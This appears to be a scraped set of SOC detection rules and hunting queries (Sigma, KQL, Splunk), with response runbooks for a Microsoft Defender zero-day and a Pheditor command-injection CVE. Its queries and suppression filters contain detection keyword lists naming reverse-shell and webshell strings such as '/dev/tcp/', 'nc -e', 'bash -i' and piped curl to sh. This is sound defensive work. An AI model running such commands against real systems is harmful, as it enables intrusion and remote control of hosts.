id: 2c1b0a9f-8e7d-4c6b-9a5e-4d3c2b1a0f9e
description: Detects ISO container files dropped to user Downloads by browsers/email — required precursor for RoguePlanet Defender zero-day exploit which requires standard user to mount an ISO
references:

author: SOC Detection Engineering

tags:

logsource:
  category: file_event
  product: windows
detection:
  selection_file:

  selection_proc:
    Image|endswith:

      - '\msedge.exe'
      - '\firefox.exe'
      - '\brave.exe'
      - '\outlook.exe'
      - '\thunderbird.exe'
  condition: selection_file and selection_proc
level: medium
source:windows.sysmon @EventID:11 @TargetFilename:(*\Downloads\*.iso OR *\Downloads\*.ISO) @Image:(*\chrome.exe OR *\msedge.exe OR *\firefox.exe OR *\brave.exe OR *\outlook.exe OR *\OUTLOOK.EXE OR *\thunderbird.exe)
#event_simpleName=FileWritten TargetFileName=/\\Downloads\\.*\.iso$/i
| ContextImageFileName=/\\(chrome|msedge|firefox|brave|outlook|thunderbird)\.exe$/i
| groupBy([aid, ComputerName, UserName, ContextImageFileName, TargetFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.action=created Filesystem.file_name="*.iso" Filesystem.file_path="*\\Downloads\\*" Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","outlook.exe","thunderbird.exe") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path Filesystem.file_name | `drop_dm_object_name(Filesystem)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`

Defender Component (MsMpEng/NisSrv) Spawns Interactive Shell with SYSTEM Integrity AIExploitation High
Detects Microsoft Defender service processes spawning shells, script hosts, or LOLBins with SYSTEM integrity — the direct RoguePlanet exploit primitive. The race condition results in arbitrary code execution inheriting the Defender service token (NT AUTHORITY\SYSTEM). Rationale: Article-specific: PoC result is 'a shell with SYSTEM-level privileges' from a Defender race condition. MsMpEng.exe / NisSrv.exe spawning cmd/powershell/script hosts at System integrity is anomalous in any production environment — Defender's legitimate children are MpCmdRun.exe and conhost. This is the exploitation outcome regardless of which Defender bug class (RoguePlanet, BlueHammer-style memory corruption, etc.) is used.
ATT&CKT1068 T1134.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Defender platform update spawning conhost.exe via MpCmdRun.exe scheduled scan
  • MpCmdRun.exe-initiated quarantine cleanup invoking cmd.exe (rare, usually direct API)
  • Third-party EDR migration script that hooks into Defender service shutdown
  • Sysadmin running 'sc start WinDefend' under PsExec which forks via service host (different parent path)
  • Custom DLP product launching script host inside Defender's exclusion scan
Suppression filter
| where not (FileName =~ "conhost.exe" and InitiatingProcessParentFileName in~ ("MpCmdRun.exe","services.exe","MsSense.exe"))
| where not (InitiatingProcessSHA256 in (dynamic([])) and FileName =~ "MpCmdRun.exe")
Response runbook
1) Triage: verify InitiatingProcessSHA256 matches a Microsoft-signed Defender binary in the org's known-good baseline; if hash differs, treat as confirmed exploitation. Pull the full process tree and 10 minutes of preceding DeviceFileEvents on the DeviceId for ISO mount artefacts. 2) Contain: isolate the device via MDE Live Response immediately (SYSTEM shell = full host compromise). Capture memory and the spawned process's commandline before kill. Force Defender platform update via MEM/Intune. 3) Hunt: query DeviceNetworkEvents on the same DeviceId for outbound to projectnightcrawler.dev (UC3); search org-wide for the same parent-child pair to identify other compromised hosts; review for follow-on lateral movement from the SYSTEM context (PsExec, WMI, scheduled tasks).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("MsMpEng.exe","NisSrv.exe","MpDefenderCoreService.exe")
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","bash.exe","sh.exe")
| where ProcessIntegrityLevel =~ "System"
// Filter legitimate Defender housekeeping children
| where not (FileName =~ "conhost.exe" and InitiatingProcessParentFileName =~ "MpCmdRun.exe")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentSHA256 = InitiatingProcessSHA256,
          ChildImage = FolderPath,
          ChildCmd = ProcessCommandLine,
          ChildSHA256 = SHA256,
          ProcessIntegrityLevel
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| extend ParentName = tostring(split(ParentProcessName, "\\")[-1])
| extend ChildName = tostring(split(NewProcessName, "\\")[-1])
| where ParentName in~ ("MsMpEng.exe","NisSrv.exe","MpDefenderCoreService.exe")
| where ChildName in~ ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
| where TokenElevationType has "%%1936" or SubjectUserSid == "S-1-5-18"   // SYSTEM token
| project TimeGenerated, Computer, SubjectUserName, SubjectUserSid, ParentProcessName, NewProcessName, CommandLine, TokenElevationType
| order by TimeGenerated desc
title: Microsoft Defender Service Component Spawns SYSTEM Shell - RoguePlanet Exploit
id: 8a3f2c4d-5e6b-4c7d-9f1a-2b3c4d5e6f7a
description: Detects shell, script host or LOLBin child process spawned by Defender service components (MsMpEng.exe, NisSrv.exe) with SYSTEM integrity, indicative of the RoguePlanet race-condition zero-day exploitation
references:
  - https://thehackernews.com/2026/06/microsoft-defender-rogueplanet-zero-day.html
author: SOC Detection Engineering
date: 2026/06/12
tags:
  - attack.t1068
  - attack.t1134.001
  - attack.privilege_escalation
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\MsMpEng.exe'
      - '\NisSrv.exe'
      - '\MpDefenderCoreService.exe'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
      - '\bash.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Defender platform self-update conhost spawn (filter via grandparent MpCmdRun.exe)
level: critical
source:windows.sysmon @EventID:1 @ParentImage:(*\MsMpEng.exe OR *\msmpeng.exe OR *\NisSrv.exe OR *\nissrv.exe OR *\MpDefenderCoreService.exe) @Image:(*\cmd.exe OR *\CMD.EXE OR *\powershell.exe OR *\PowerShell.exe OR *\POWERSHELL.EXE OR *\pwsh.exe OR *\wscript.exe OR *\WSCRIPT.EXE OR *\cscript.exe OR *\mshta.exe OR *\MSHTA.EXE OR *\rundll32.exe OR *\RUNDLL32.EXE OR *\regsvr32.exe)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(MsMpEng|NisSrv|MpDefenderCoreService)\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|wscript|cscript|mshta|rundll32|regsvr32|bash)\.exe$/i
| IntegrityLevel="System"
| groupBy([aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine, SHA256HashData], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("MsMpEng.exe","NisSrv.exe","MpDefenderCoreService.exe") Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","bash.exe","sh.exe") Processes.user IN ("SYSTEM","NT AUTHORITY\\SYSTEM") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process Processes.process_integrity_level | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("MsMpEng.exe","NisSrv.exe","MpDefenderCoreService.exe") Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","bash.exe","sh.exe") Processes.user IN ("SYSTEM","NT AUTHORITY\\SYSTEM") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process Processes.process_integrity_level | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Connection to RoguePlanet PoC C2 Domain projectnightcrawler.dev AICommand & Control High
Alerts on DNS resolution or network connection to projectnightcrawler.dev, the C2/staging infrastructure tied to the RoguePlanet PoC release by Chaotic Eclipse / MSNightmare. Any contact with this domain from a corporate endpoint should be treated as confirmed engagement. Rationale: Pre-extracted IOC projectnightcrawler.dev — a brand-new low-prevalence domain tied to the actor publishing the PoC. Domain-based detection is high-fidelity because there is no legitimate business reason for corporate endpoints to resolve this host.
ATT&CKT1071.001 T1568
Data sourcesNetwork_Resolution.DNS Web.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • SOC analyst sandboxing the PoC for evaluation
  • TI researcher VM detonating the sample
  • Internal red-team exercise reusing public PoC infrastructure
  • Cached DNS lookup from an internet-wide scanner relayed through a proxy log
  • Browser prefetch from a security blog post embedding the domain
Suppression filter
| where not (InitiatingProcessFileName in~ ("msedge.exe","chrome.exe","firefox.exe") and AccountName in (dynamic(["soc-analyst1","ti-research"])))
Response runbook
1) Triage: identify the initiating process via InitiatingProcessFileName/ContextImageFileName — if MsMpEng.exe, NisSrv.exe or a recently-spawned shell, treat as confirmed RoguePlanet exploitation. If browser/security analyst tooling, validate against authorised research activity. 2) Contain: sinkhole projectnightcrawler.dev at corporate DNS, block at perimeter proxy, isolate any endpoint with successful DNS resolution AND any process anomaly from UC2. 3) Hunt: 30-day retroactive search across DnsEvents/proxy logs for the domain; on hits, pivot to DeviceProcessEvents on the same DeviceId for Defender SYSTEM shells (UC2) and ISO mounts (UC1); add the domain and any resolved IPs to the org's high-confidence IOC feed.
union
(DeviceNetworkEvents
  | where Timestamp > ago(30d)
  | where RemoteUrl has "projectnightcrawler.dev"
  | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, ProcessName=InitiatingProcessFileName, ProcessCmd=InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, Source="NetworkEvents"),
(DeviceEvents
  | where Timestamp > ago(30d)
  | where ActionType == "DnsQueryResponse"
  | where AdditionalFields has "projectnightcrawler.dev" or RemoteUrl has "projectnightcrawler.dev"
  | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, ProcessName=InitiatingProcessFileName, ProcessCmd=InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort=int(null), Source="DnsQuery")
| order by Timestamp desc
union isfuzzy=true
(DnsEvents
  | where TimeGenerated > ago(30d)
  | where Name has "projectnightcrawler.dev"
  | project TimeGenerated, Computer, ClientIP, Name, QueryType, Result, Source="DnsEvents"),
(CommonSecurityLog
  | where TimeGenerated > ago(30d)
  | where RequestURL has "projectnightcrawler.dev" or DestinationHostName has "projectnightcrawler.dev"
  | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, Name=coalesce(DestinationHostName, RequestURL), QueryType=ApplicationProtocol, Result=DeviceAction, Source="Proxy"),
(ImDnsActivity
  | where TimeGenerated > ago(30d)
  | where DnsQuery has "projectnightcrawler.dev"
  | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, Name=DnsQuery, QueryType=DnsQueryTypeName, Result=DnsResponseCodeName, Source="ASIM")
| order by TimeGenerated desc
title: DNS Lookup for RoguePlanet PoC Domain projectnightcrawler.dev
id: 7b4e3d2c-1a0f-4b9d-8e7c-6a5b4c3d2e1f
description: Detects DNS resolution to projectnightcrawler.dev — infrastructure associated with the Chaotic Eclipse RoguePlanet Defender zero-day PoC release
references:

author: SOC Detection Engineering

logsource:

detection:

level: high
(source:windows.sysmon @EventID:22 @QueryName:*projectnightcrawler.dev*) OR (source:windows.sysmon @EventID:3 @DestinationHostname:*projectnightcrawler.dev*)
#event_simpleName=DnsRequest DomainName=/projectnightcrawler\.dev/i

Unpatched Assets Vulnerable to Chaotic Eclipse Defender CVE Cluster AIReconnaissance High
Inventory hunt for endpoints still missing patches for CVE-2026-33825 (BlueHammer), CVE-2026-45498 (UnDefend), CVE-2026-41091 (RedSun) — the three prior Defender zero-days from the same researcher, all of which the article confirms 'have since been exploited in the wild'. RoguePlanet is unpatched and these provide the closest pivot for exposure scoping. Rationale: Article-specific: explicitly enumerates the three sibling Defender CVEs from the same researcher and states all three 'have since been exploited in the wild'. Pivoting on this CVE cluster surfaces hosts with chronic Defender patch lag — the same population most at risk for the unpatched RoguePlanet flaw.
ATT&CKT1190 T1068
Data sourcesVulnerabilities
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Defender platform version metadata lag (24-48h between push and TVM update)
  • Air-gapped or offline asset reporting stale state
  • Devices in pilot/exempt patch ring scheduled for next maintenance window
  • Defender engine update pending Windows Update orchestration restart
  • Asset retired but still emitting one final TVM heartbeat
Response runbook
1) Triage: bucket hits by RecommendedSecurityUpdate KB number — confirm whether the published Defender platform/engine update covers the CVE on the affected OS build. 2) Contain: emergency-deploy the Defender platform update via Intune/MEM out-of-band to all matching DeviceIds; for assets that cannot be patched immediately, enable ASR rule 'Block credential stealing from LSASS' and consider tamper-protection enforcement as compensating control. 3) Hunt: cross-reference DeviceIds with UC2 (Defender SYSTEM shell) and UC3 (projectnightcrawler.dev) hits — co-occurrence indicates active exploitation against these unpatched hosts; review Defender platform/engine version distribution org-wide and flag patch ring drift to vulnerability management.
DeviceTvmSoftwareVulnerabilities
| where CveId in ("CVE-2026-33825","CVE-2026-45498","CVE-2026-41091")
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), OpenCVEs=make_set(CveId) by DeviceId, DeviceName, OSPlatform, OSVersion, SoftwareName, SoftwareVersion, RecommendedSecurityUpdate
| extend ExposureCount=array_length(OpenCVEs)
| order by ExposureCount desc, LastSeen desc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(7d)
| where CveId in ("CVE-2026-33825","CVE-2026-45498","CVE-2026-41091")
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), OpenCVEs=make_set(CveId) by DeviceId, DeviceName, OSPlatform, OSVersion, SoftwareName, SoftwareVersion, RecommendedSecurityUpdate
| extend ExposureCount=array_length(OpenCVEs)
| order by ExposureCount desc, LastSeen desc
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Vulnerabilities where Vulnerabilities.cve IN ("CVE-2026-33825","CVE-2026-45498","CVE-2026-41091") by Vulnerabilities.dest Vulnerabilities.cve Vulnerabilities.severity Vulnerabilities.signature | `drop_dm_object_name(Vulnerabilities)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Vulnerabilities where Vulnerabilities.cve IN ("CVE-2026-33825","CVE-2026-45498","CVE-2026-41091") by Vulnerabilities.dest Vulnerabilities.cve Vulnerabilities.severity Vulnerabilities.signature | `drop_dm_object_name(Vulnerabilities)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("") or RemoteUrl has_any ("projectnightcrawler.dev")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic([""]);
let BadDomains = dynamic(["projectnightcrawler.dev"]);
ImNetworkSession

   or Url has_any (BadDomains)

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-33825", "CVE-2026-45498", "CVE-2026-41091")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`

| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`

    [| tstats summariesonly=false earliest(_time) AS exec_time

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → [LLM] Pheditor CVE-2026-48030 — vulnerable Pheditor 2.0.1–2.0.3 asset inventory exposure · Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Pheditor CVE-2026-48030 — shell metacharacters in 'dir' POST parameter to pheditor.php
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Pheditor CVE-2026-48030 — web server spawning shell interpreter from terminal handler RCE · [LLM] Pheditor CVE-2026-48030 — webshell drop: PHP / web account writing .php to webroot · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Pheditor CVE-2026-48030 — web server spawning shell interpreter from terminal handler RCE AIInstallation High
Detects PHP-FPM / Apache / Nginx (or php-cgi) processes spawning sh/bash/dash under web service account context (www-data, apache, nginx). This is the post-exploitation footprint of the unsanitized 'dir' POST parameter in pheditor.php executing arbitrary OS commands via shell_exec(). Rationale: Article states 'achieving full Remote Code Execution with web server privileges' and PoC shows shell_exec() reaching sh via the cd-prefix injection from 'dir'. Pivot is the parent/child pair (PHP→sh) under web account — the exact runtime footprint of the exploit. Cross-checked NVD CVE-2026-48030 advisory and CWE-78 OS command injection canonical patterns. Cross-checked against: • https://github.com/advisories/GHSA-jvc5-6g7q-c843 • https://attack.mitre.org/techniques/T1059/004/ • https://cwe.mitre.org/data/definitions/78.html
ATT&CKT1059.004 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate site-management cron jobs run as www-data invoking shell helpers (e.g. WordPress wp-cron shelling out to mysqldump)
  • Composer install / npm postinstall scripts run under web user during deploy spawning bash to compile assets
  • Health-check scripts (Sensu, Datadog Agent) running as www-data executing /bin/sh probes
  • Legitimate Pheditor terminal commands the admin actually typed (ls, ps) reaching the same code path
  • Container init scripts in PHP base images where entrypoint is php-fpm and CMD launches bash
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("/usr/local/bin/wp","composer.phar","datadog-agent","sensu-client","newrelic-daemon") and not(ProcessCommandLine has_any ("curl ","wget ","echo '<?php","/dev/tcp/")))
Response runbook
1) Triage — pull the full ProcessCommandLine and ParentProcessCommandLine; look for 'pheditor.php' / 'action=terminal' in the parent chain and the article's IoC strings (cd <path>; curl, echo '<?php', /var/www/html/shell.php). Cross-reference web access logs for the same source IP hitting POST /pheditor.php within the prior 60s. 2) Contain — isolate the host via MDE Live Response or quarantine SG; revoke any pheditor admin credentials and rotate web-app session secret; block outbound from the web user to the attacker C2 IP. 3) Hunt — search DeviceFileEvents for .php writes under /var/www by web user (companion UC), DeviceNetworkEvents for outbound curl/wget egress, and AsepValueUpdate / crontab edits for persistence; pivot on the source IP across all internet-facing pheditor instances.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("php-fpm","php","php-cgi","apache2","httpd","nginx","php7.4","php8.0","php8.1","php8.2")
| where FileName in~ ("sh","bash","dash","ash","zsh")
| where InitiatingProcessAccountName in~ ("www-data","apache","nginx","nobody","httpd","_www","wwwrun")
| where ProcessCommandLine has_any ("curl ","wget ","echo '<?php","/dev/tcp/","; curl","|sh","| sh","|bash","| bash","cd /var/www","cd /tmp","nc -e","bash -i")
   or InitiatingProcessCommandLine has "pheditor"
| project Timestamp, DeviceName, AccountName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName has_any ("php-fpm","php","php-cgi","apache2","httpd","nginx")
| where ActingProcessName has_any ("sh","bash","dash","ash","zsh")
| where ActorUsername in~ ("www-data","apache","nginx","nobody","httpd","_www","wwwrun")
| where ActingProcessCommandLine has_any ("curl ","wget ","echo '<?php","/dev/tcp/","|sh","| sh","|bash","| bash","cd /var/www","cd /tmp","nc -e","bash -i")
   or ParentProcessCommandLine has "pheditor"
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

Pheditor CVE-2026-48030 — shell metacharacters in 'dir' POST parameter to pheditor.php AIExploitation High
